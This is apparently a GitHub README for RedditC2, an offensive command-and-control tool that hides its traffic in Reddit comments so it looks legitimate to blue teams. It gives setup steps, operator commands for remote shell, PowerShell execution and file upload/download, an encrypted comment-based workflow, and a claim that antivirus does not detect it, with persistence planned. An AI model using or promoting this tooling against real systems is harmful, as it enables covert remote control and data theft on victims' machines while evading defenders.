<h1 align="center"> RedditC2</h1>
Abusing Reddit API to host the C2 traffic, since most of the blue-team members use Reddit, it might be a great way to make the traffic look legit.
<p align="center">
  <img width="300" height="300" src="https://user-images.githubusercontent.com/37262788/205896739-7feb0cea-cf04-4011-aa6b-66ba5b82b9ba.png">
</p>

---
> :no_entry_sign: [Disclaimer]: Use of this project is for **Educational/ Testing purposes only**. Using it on **unauthorised machines** is **strictly forbidden**. If somebody is found to use it for **illegal/ malicious intent**, author of the repo will **not** be held responsible.
---

## CyFI setup instructions
1. Install dependencies
```bash
pip3 install praw numpy pyreadline3 
```
2. Create test reddit account
   1. Manually sign up a reddit account and verify email address.
   2. Create a reddit script app, go to https://www.reddit.com/prefs/apps/, name the app, select 'script', set redirect url to 'http://localhost'.
   3. Then should see the app client_id under the newly created app name, and client_secret labeled as 'secret'.
3. Config the Teamserver.
   1. Go to the RedditC2/Teamserver folder.
   2. Put the previous client_id, client_secret, username, and password in config.json.
4. Setup a subreddit for C2.
   1. Manually create a subreddit or use an existing subreddit in your reddit account. For anomynity, create a new and Private subreddit (mySubreddit), and manually create a post under the subreddit (myPost).
5. Start the teamserver.
```bash
python teamserver.py
```
6. Enter the C2.
```bash
RedditC2> set subreddit mySubreddit
[*] Subreddit set to: mySubreddit
```
```bash
RedditC2> list listeners
[+] myPost
```
```bash
RedditC2> use listener myPost
[+] Entered the session
myPost>
```
7. Execute C2 commands. (During testing, the newly created reddit account is suspended as soon as starting to send commands.)
```bash
myPost> run whoami
[+] Command sent
[+] Received Output:
your_user_name
```
```bash
myPost> powershell 2+2
[+] Command sent
[+] Received Output:
4
```
To download and upload file use:
```bash
upload /path/to/file
download /path/to/file
```
To exit:
```bash
run exit
```
8. Additional commands
```
RedditC2> help

set subreddit                    --> Select the subreddit where you will create the listener
list listeners                   --> List all listeners you can use within the subreddit
use listener [session number]    --> Interact With Each Session Individually
run [command]                    --> Execute a cmd command
download [file_name]             --> Download a file from the target
upload [file_name]               --> Upload a file to the target
powershell [command]             --> Execute a powershell command
help                             --> Show the help menu
exit                             --> Exit from the session
clear                            --> Clear the screen
```


## Requirements
Install **PRAW** library in python3:  
```bash
pip3 install praw
```

## Quickstart
See the [Quickstart guide](https://github.com/kleiton0x00/RedditC2/wiki/Setup) on how to get going right away!

## Demo
https://user-images.githubusercontent.com/37262788/206015879-589614d5-1a7a-4c21-a342-75bdfc677a61.mp4

## Workflow
### Teamserver  
1. Go to the specific Reddit Post & post a new comment with the command ("in: <encrypted command>")
2. Read for new comment which includes the word "out:"
3. If no such comment is found, go back to step 2
4. Parse the comment, decrypt it and read it's output
5. Edit the existing comment to "executed", to avoid reexecuting it

### Client  
1. Go to the specific Reddit Post & read the latest comment which includes "in:"
2. If no new comment is detected, go back to step 1
3. Parse the command out of the comment, decrypt it and execute it locally
4. Encrypt the command's output and reply it to the respective comment ("out:" <encrypted output>)

Below is a demonstration of the XOR-encrypted C2 traffic for understanding purposes:  
![Screenshot from 2022-12-15 10-58-34](https://user-images.githubusercontent.com/37262788/207849406-6c221102-9352-46dc-a461-947b66e3a712.png)

## Scanning results
Since it is a custom C2 Implant, it doesn't get detected by any AV as the bevahiour is completely legit.
<img width="406" height="553" src="https://user-images.githubusercontent.com/37262788/205900070-783c65b3-4d83-4d5e-82e3-c20571b403e1.png">

## TO-DO
- [X] Teamserver and agent compatible in Windows/Linux  
- [X] Make the traffic encrypted  
- [X] Add upload/download feature
- [ ] Add persistence feature
- [ ] Generate the agents dynamically (from the TeamServer)
- [X] Tab autocompletion

## Credits
Special thanks to [@T4TCH3R](https://github.com/T4TCH3R/) for working with me and contributing to this project.
